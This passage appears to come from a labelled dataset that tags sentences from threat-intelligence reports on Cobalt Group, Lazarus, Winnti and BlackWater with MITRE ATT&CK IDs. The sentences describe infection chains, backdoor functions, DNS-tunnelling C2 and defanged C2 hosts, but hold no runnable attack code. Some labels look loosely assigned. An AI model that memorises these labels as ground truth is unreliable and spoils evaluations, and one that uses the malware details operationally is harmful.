either VenomKit or Taurus Building Kit, more\\_eggs, and the Provider\u2019s C2 infrastructure.", "labels": ["TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Figure 4 also shows that the Cobalt group ceased to use the Provider after the campaign on 2 August, and then started to consistently use different malware and infrastructure.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Figure 5 \u2014 Cobalt and GC campaigns using the Provider", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "1.Delivery.Each campaign began with a spear phishing email, but each presented differences depending on the threat actor behind the attack:", "labels": ["T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "* GC threat actors used either compromised or spoofed email addresses.", "labels": ["T1586"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "The other 12 spear phishing emails were sent from domain names previously registered by them, imitating a specific organization.", "labels": ["T1566", "T1583"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Registration of look-alike domains is a common technique used by Cobalt Group.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "2.Exploitation I (Optional).Both threat actor groups used a non-malicious PDF, luring the user to click on the contained link in order to download the maldoc.", "labels": ["T1586"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "By doing this, the user will first visit the legit Google logout page and then automatically be redirected to the final URL, triggering the download of the malicious document.", "labels": ["T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "* Cobalt only used this technique two times, during the campaigns of 7 and 29 June.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "3.Exploitation II \u2014 Getting the Maldoc.The user downloads either a macro-weaponized Word document created by Taurus Builder Kit, or a malicious RTF created by VenomKit.", "labels": ["G0080", "T1204"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Successful execution of the maldocs initiates the download of additional batch scripts and then the ultimate download of the more\\_eggs backdoor.", "labels": ["T1059", "T1204", "T1105"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "* Cobalt Group only used more\\_eggs versions 2.0, having a specific command named *via\\_x*.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "This command is used to execute additional executables via cmd.exe.", "labels": ["T1059"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "For those campaigns that were not using the non-malicious PDF attack vector, the victims got the downloader through either browsing a link included in the email body, or directly through the email attachment.", "labels": ["T1566", "T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "4.C2 I \u2014 Getting the Backdoor.The maldoc retrieves more\\_eggs from a remote location and executes it. Next, the backdoor starts beaconing to the C2 defined in the *Gate* variable.", "labels": ["TA0011", "TA0002", "TA0011", "T1105", "TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "5.C2 II \u2014 Getting the Final Payload.Once the threat actor (or the Provider Operator) determines that the infected system is of interest, the final payload is eventually pushed and executed.", "labels": ["TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "To note, we were not always able to get the final payload because the more\\_eggs C2 normally has a short lifetime.", "labels": ["TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "* Campaigns attributed to GC01 resulted in the download of three different RATs: Netwire, Remcos, and Revenge.", "labels": ["S0332", "S0379", "S0332"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "* Campaigns attributed to Cobalt Group resulted in the download of either the CobInt backdoor, or the Cobalt Strike beacon.", "labels": ["G0080", "S0154"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "So far, CobInt is a backdoor that was only observed in Cobalt Group campaigns, while Cobalt Strike is a notorious attack framework used to execute Red Team exercises.", "labels": ["G0080", "S0154"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "We consider the use of CobInt and Cobalt Strike as a final payload a strong indicator while attributing attacks to the Cobalt Group.", "labels": ["S0154", "G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "[1] To note, we only included in the timeline those campaigns attributed to Cobalt group that used the Provider or occurred near or in the same month of GC\u2019s activities.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "**Email Attachments (Not-Malicious PDF with Google Redirector)**", "labels": ["T1566", "T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "### GC Maas C2 infrastructure", "labels": ["TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "New Evidence Might Link Lazarus Tool Found in Chile RedBanc Intrusion to Previous Attacks in Pakistan", "labels": ["G0032"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "QuoINT has uncovered an attack against a Pakistani financial service provider\u2019s employee that highly matched the Tactics, Techniques, and Procedures (TTPs) [reported](http://www.trendtic.cl/2019/01/exclusivo-asi-fue-el-intento-de-ciberataque-a-redbanc-en-diciembre/) in a recent intrusion at the Chilean interbank network Redbanc [linked by Flashpoint](https://www.flashpoint-intel.com/blog/disclosure-chilean-redbanc-intrusion-lazarus-ties/) to the prolific North Korea-linked Advanced Persistent Threat (APT) group Lazarus (also known as HIDDEN COBRA).", "labels": ["G0032", "G0032"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "Further, we uncovered new evidence that might link the November 2018 attacks against multiple Pakistani banks to Lazarus.", "labels": ["G0032"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "The sample, named ApplicationPDF.exe, was uploaded from Pakistan to VirusTotal on January 16 as a part of a ZIP archive, which also contained a generated PDF and the Windows DLL required for its execution.", "labels": ["T1204"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "The PDF contains what is highly likely the personal information of the targeted victim.[1]", "labels": ["T1566"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "The interviewer eventually asks applicants to download and execute a tool (ApplicationPDF.exe) on their computer in order to generate their application form in PDF format.", "labels": ["T1566"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "The execution of the tool kicks off the infection process.", "labels": ["T1204"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "The evidence obtained suggests that the victim executed ApplicationPDF.exe: the compressed archive we found also included the PDF that was most likely generated by the victim.", "labels": ["T1204"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "Once executed, the sample communicates the C2 URL (hxxps://ecombox[.]store/tbl\\_add[.]php?action=agetpsb), and after connecting, it drops a script file (REG\\_TIME.ps1) used to invoke the PowerShell process.", "labels": ["TA0011", "T1105", "T1059"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "**PowerRatankba variant** (REG\\_TIME.ps1)", "labels": [], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "The script arrives encrypted and will decrypt itself in memory to the following sample:", "labels": ["T1140"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "**Decrypted\\_PowerRatankba variant** (REG\\_TIME.ps1)", "labels": [], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "PowerRatankba is a PowerShell based reconnaissance tool that conducts initial information gathering from the victim\u2019s system and functions as a backdoor.", "labels": ["TA0043", "T1059", "TA0007", "TA0003"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "In both Chile and Pakistan, the same variant is delivered, thus, accepts the same six commands, contains the same hardcoded C2 URL (hxxps://ecombox[.]store/tbl\\_add.php) and commented out C2 (hxxps://bodyshoppechiropractic[.]com/tbl\\_add.php).", "labels": ["TA0011", "TA0011", "T1071", "T1071"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "The backdoor functionality provided by the toolkit could enable the actor to deploy further stages of the attack if the victim\u2019s system is deemed interesting.", "labels": ["T1105"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "PowerRatankba is capable of the following functions:", "labels": [], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "* Send data to the server", "labels": ["TA0010"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "* Delete agent", "labels": ["T1562"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "* Modify and replace files (.ps1 and .VBS)", "labels": ["T1059", "T1059"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "* Download files", "labels": ["T1105"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "* Kill agent (exit)", "labels": ["T1562"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "* Delay execution", "labels": [], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "* No command executes a batch script", "labels": ["TA0002", "T1059"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "In December 2017, researchers first discovered and documented [PowerRatankba](https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new).", "labels": [], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "Reportedly, the malware is a successor to an earlier implant dubbed Ratankba, used within the Lazarus group\u2019s financially focused attacks.", "labels": ["G0032"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "We identified an [earlier version](https://www.hybrid-analysis.com/sample/db8163d054a35522d0dec35743cfd2c9872e0eb446467b573a79f84d61761471?environmentId=100) of [PowerRatankba](https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new) submitted to Hybrid Analysis in January 2018, and comparative analysis of the sample in both cases exhibits some aspects of evolution.", "labels": [], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "Lazarus is known for continuously evolving its toolset and Tactics, Techniques and Procedures (TTPs).", "labels": ["G0032"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "Lazarus is an APT threat actor group that has operated since at least 2009, and attributed to a variety attacks across multiple sectors including financials, and entertainment.", "labels": ["G0032"], "document": "quoteintelligence_2019-01-21_new-evidence-might-link-lazarus"}, {"sentence": "WINNTI GROUP: Insights From the Past", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Newly uncovered DNS tunnelling technique, and new campaign against South Korean gaming company", "labels": ["T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "* In January 2020, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "* The Winnti sample we analysed was highly likely developed in 2015, and likely used around this year for the first time, it is unclear how long the compromise existed in the compromised environment.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "* Although the malware was likely used years ago, further analysis revealed a previously unreported C2 technique never attributed to any Winnti Group\u2019s toolkits.", "labels": ["TA0011", "G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "* The technique relies on a DNS Tunneling communication channel through a custom implementation of the [iodine source code](https://github.com/yarrick/iodine), an open-source software that enables the tunneling of IPv4 data through a DNS server.", "labels": ["T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "* Additionally, we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti-related attack components, and the targeting of a previously-unreported South Korean video game company.", "labels": ["T1218"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "* The sophistication of the techniques we uncovered confirms that the Winnti Group is a highly sophisticated, and highly committed Advanced Persistent Group \u00a0targeting a plethora of different industry sectors in Europe and South Asia.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China\u2019s intelligence branch linked through their use of shared goals and attack resources.", "labels": ["G0044", "G0096", "G0044", "G0044", "G0044", "G0096", "G0044", "G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "On Friday, 13 January, QuoIntelligence (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Additionally, during our analysis we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti related drivers, and a potential campaign against an already known South Korean video game company.", "labels": ["G0044", "T1588"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "In the last year, researchers and journalists have publicly disclosed that the Winnti group targeted and eventually compromised Henkel (2014), BASF (2015), Bayer (2018) and Roche (2019).", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "This most recent\u00a0previously unreported German chemical company is yet another German chemical company targeted by Winnti since 2015.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "*Figure 1: Timeline of attacks located in Germany and attributed to Winnti*", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "In December 2019, Germany\u2019s Federal Office for the Protection of the Constitution (BfV) released a [report](https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf) related to the alleged Chinese state sponsored umbrella organization known as the Winnti Group.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Through our internal malware analysis, we are confident that the sample we discovered is highly similar to the Winnti sample described in the BfV report.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "The sample also matches known characteristics of Winnti\u2019s arsenal shared through intelligence reports produced by [ESET](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf).", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "### The Winnti Group", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Notably, various operations attributed to other China-linked threat actor groups, such as APT17 and Ke3chang, have also leveraged its backdoor malware.", "labels": ["G0025", "G0004"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "In the latest Winnti Group public report, FireEye researchers [reported](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html) of a new widespread campaign attributed to APT41 which involves exploitation attempts of recently disclosed and patched vulnerabilities for products of Cisco, Citrix, and Zoho.", "labels": ["G0044", "G0096", "T1190"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "According to the researchers, identified victim systems demonstrated the threat actor leveraged commercially available post exploitation tools such as Cobalt Strike and Meterpreter, which are essentially full featured backdoors.", "labels": ["S0154"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "*Table 1 \u2013 Winnti sample*", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Similar to other Winnti samples, the configuration section contains a string referring to the name of the campaign.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "*Figure 2 \u2013 Extracted configuration from Winnti sample*", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "This is essentially [Windows x64 Driver Signature Enforcement Overrider](https://github.com/hfiref0x/DSEFix) (DSEFix), used\u00a0 \u00a0to temporarily disable the driver signature enforcement on Windows systems by using an included old, legit VirtualBox driver, both signed and exploitable.", "labels": ["T1553", "T1553"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "By running dsefix.exe, the malware can bypass driver verification and install its own drivers.", "labels": ["T1553"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "This is the vulnerable, correctly signed with a digital certificate, VirtualBox driver that is used for exploitation.", "labels": ["T1553"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "It is used regularly by various threat actors, and by the previously highlighted dsefix.exe*.* The driver can also be used to perform the Turla Driver Loader (TDL) exploitation [technique](https://github.com/hfiref0x/TDL), a similar technique as DSEFix.", "labels": ["G0010"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "In late 2019, [ExaTrack](https://exatrack.com/public/winnti_EN.pdf)released their analysis of a signed Winnti rootkit previously observed in the wild, which we confirm is essentially the same rootkit driver.", "labels": ["G0044", "T1014", "T1014"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "This rootkit driver seems to be largely the same as driver1.sys with the same characteristics including structure, I/O control, and device strings.", "labels": ["T1014"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "### C2 DNS Tunneling", "labels": ["TA0011", "T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "*Figure 3 \u2013 observed network IoCs in Winnti sample*", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "This IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation routine also populates the list with the system\u2019s DNS, and the OpenDNS server is only used as fallback case to ensure the C2 domain gets resolved.", "labels": ["TA0011", "T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Notably, in the last years, multiple researchers have reported Winnti/PlugX C2 hostnames hosted in the mooo[.]com zone.", "labels": ["G0044", "S0013", "TA0011"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Upon further investigation we found out that the malware includes the open source [iodine source code](https://github.com/yarrick/iodine) \u2013 software that enables the tunneling of IPv4 data through a DNS server.", "labels": ["T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Interestingly, we are not aware of any earlier documentation highlighting Winnti specifically leveraging iodine for DNS tunneling.", "labels": ["G0044", "T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "However, researchers at the Ruhr University Bochum, while hunting for DNS tunnels, [observed](https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf) APT32 and Wekby APT groups using NULL and TXT records as a C2 communication channel, as well as mentioning the mooo[.]com top level domain in their findings.", "labels": ["G0050", "TA0011"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "The implementation of iodine used in the Winnti sample is integrated and uses some custom wrapper, as evidence by the matching functions we discuss in further detail in the following section.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "**Use of Iodine for C2 DNS Tunneling**", "labels": ["TA0011", "T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "The iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in memory, and includes at least the following 15 matching functions:", "labels": ["T1071", "T1620"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "For instance, the 64bit executable contains the build\\_hostname function (Code 2), which corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3):", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "*Code 2- iodine\\_0-6-0\\_build\\_hostname*", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "*Code 3- iodine\\_0-6-0\\_build\\_hostname*", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Further, comparative analysis indicates that for the implementation of iodine in this Winnti attack operation, there is no perfect match for the two versions having 64bit pre-compiled binaries.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "This indicates iodine was compiled from source, and it is reasonable it is being used as a library, and not in its normal distribution format of a standalone executable.", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "The DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the figure below.", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "*Figure 4 \u2013 C2 channel over DNS*", "labels": ["T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "1.The malware generates a hostname and appends it to the embedded C2 dick[.]mooo[.]com, and makes a NULL query to the resulted FQDN (e.g. abcde is appended to .dick[.]mooo[.]com).", "labels": ["TA0011"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Notably, NULL and TXT DNS request types are iodine\u2019s preferred channels since they are \u201c[*expected to provide the largest downstream bandwidth*](https://github.com/yarrick/iodine)\u201d.", "labels": ["T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "It is hence not a coincidence that researchers at Ruhr University Bochum also observed an extensive use of NULL request types for DNS Tunneling purposes in their research.", "labels": ["T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "2.The infected host sends the DNS query to one of the DNS servers included in the list populated at runtime, eventually to the OpenDNS fallback server.", "labels": ["T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "At this point the DNS server executes a recursive DNS query by contacting the Name Servers (NS) of each zone, until the Authoritative NS of dick[.]mooo[.]com is obtained.", "labels": ["TA0002"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "To note, FreeDNS does provide users the capability to delegate the authority of their subdomains to external NS. In the described scenario, attackers delegated the NS of their subdomain to use their NS as a de-facto C2 server.", "labels": ["TA0011", "T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Notably, the legit DNS server acts as a proxy between the infected host and the malicious server, by making impossible for defenders the application of any filtering at the Network (L3) level.", "labels": ["T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "from Iodine\u2019s\u00a0[dns.c](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232)", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "According to\u00a0[common.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86), \u201cstruct query\u201d is defined as:", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Since QUERY\\_NAME\\_SIZE equals to 512\u00a0 (4 *128 \u2013 integers are 4 bytes) the query[128] call obtained from the reversing activity is indeed the DNS query type.", "labels": ["T1071"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "From Iodine\u2019s\u00a0[windows.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39) T\\_NULL is DNS\\_TYPE\\_NULL", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "### Winnti Signed Code With Digital Certificate from IQ Technology", "labels": ["G0044", "T1588"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "During our analysis of the Winnti sample configured to target the German chemical company, our comparative analysis of other Winnti related drivers revealed a digital certificate issued to *IQ Technology*, a Taiwanese company producing Natural language processing (NLP) and Artificial Intelligence (AI) software.", "labels": ["G0044", "G0044", "T1588"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "The rootkit driver aligns with the already known driver1.sys*.* While it is a known TTP that Winnti attributed attacks have involved stolen digital certificates for code signing its malware components, the use of this certificate is not publicly discussed, except for a brief report from a security researcher apparently associated with a Vietnamese security company.", "labels": ["T1014", "G0044", "T1014"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "*Table 3 \u2013 observed network IoCs in Winnti sample*", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "On 21 February, we detected the new submission of a 64-bit Winnti executable to a public online malware scanning service.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "As multiple researchers have reported, Winnti operators embed the name of their target directly into the malware, but in an obfuscated manner.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "The sample resembles the Winnti Dropper Install.exe described by ESET, since it is a command line executable used to drop and load additional encrypted payload:", "labels": ["G0044", "T1105"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Unfortunately we were not able to find the payload meant to be decrypted by this dropper.", "labels": ["T1105"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Based on previous knowledge and targeting of the Winnti Group, we assess that this sample was likely used to target Gravity Co., Ltd., a South Korean video game company.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "As we have also reported in the past, the video game industry is one of the preferred targets of the Winnti Group, especially for those companies operating in South Korea and Taiwan.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "Interestingly, ESET researchers, while reporting on multiple Winnti Group campaigns targeting the video game industry, listed in their report a C2 server having a Campaign ID ***GRA** KR 0629*.", "labels": ["G0044", "TA0011"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "*Excerpt from ESET Research White paper \u201c*[*CONNECTING THE DOTS Exposing the arsenal and methods of the Winnti Group*](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf)*\u201d*", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "At this time, we do not have any further evidence supporting a potential link between the sample we analysed and the C2 detailed by ESET, but the coincidence between the C2 Campaign ID/Location with the Campaign ID we extracted from the Winnti dropper is worth noting.", "labels": ["TA0011", "TA0011", "G0044", "T1105"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "The Winnti Group has exhibited their ability to breach different organizations and conduct sophisticated attack operations, typically motivated by espionage and financial gain, with various TTPs and malware toolkits.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "While attribution is not concrete due to the complexity of the group, there are links that can be drawn between operations which suggest the threat actors purporting the attacks are likely operating within the Winnti Group, or at least sharing resources.", "labels": ["G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "The detection of this unreported Winnti variant uploaded to VirusTotal and targeting a German chemical company aligns with our prior observations and research from [previous intelligence reporting](https://web.br.de/interaktiv/winnti/index.html)highlighting Winnti Group\u2019s interest in German DAX companies.", "labels": ["G0044", "G0044"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "| Persistence / Privilege Escalation | [T1215](https://attack.mitre.org/techniques/T1215/) Kernel Modules and Extensions", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "[T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation | Anti-Virus software and Advanced End-Point solution can drastically reduce the risk of both techniques.", "labels": ["T1068"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "| Defense Evasion | [T1009](https://attack.mitre.org/techniques/T1009/) Binary Padding", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "[T1014](https://attack.mitre.org/techniques/T1014/) Rootkit", "labels": ["T1014"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "[T1116](https://attack.mitre.org/techniques/T1116/) Code Signing | Many of the samples analysed were signed with expired / revoked certificate.", "labels": [], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "| Exfiltration | [T1022](https://attack.mitre.org/techniques/T1022/) Data Encrypted", "labels": ["T1560"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "[T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | \u2013 For DNS Tunnel, ensure that DNS logs are collected and reviewed.", "labels": ["T1048"], "document": "quoteintelligence_2020-04-20_winnti-group-insights-from-the"}, {"sentence": "BlackWater Malware Leveraging Beirut Tragedy in New Targeted Campaign", "labels": [], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "* [QuoIntelligence](https://quointelligence.eu/) discovered a new targeted campaign delivering the novel BlackWater malware", "labels": [], "document": 